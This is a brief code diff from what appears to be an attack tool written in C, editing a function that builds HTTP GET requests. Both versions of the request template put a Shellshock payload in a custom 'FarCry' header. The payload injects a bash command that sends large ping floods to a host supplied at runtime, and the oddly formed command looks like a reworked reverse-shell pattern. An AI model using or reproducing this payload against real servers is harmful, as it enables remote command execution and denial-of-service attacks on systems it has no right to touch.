@@ -423,7 +423,7 @@ char *build_get_query(char *host, char *page)
 {
   char *query;
   char *getpage = page;
-  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 250 -s 65535 -t 250 %s 0>&1 :\r\n Connection: close:\r\n\r\n";
+  char *tpl = "GET /%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-type : application/x-www-form-urlencoded\r\nFarCry:env x='() { :;}; ' $(command -v bash) -i >& $(command -v ping) -c 250 -s 65535 -t 250 %s 0>&1 :\r\nConnection: close:\r\n";
   
   if(getpage[0] == '/'){
     getpage = getpage + 1;
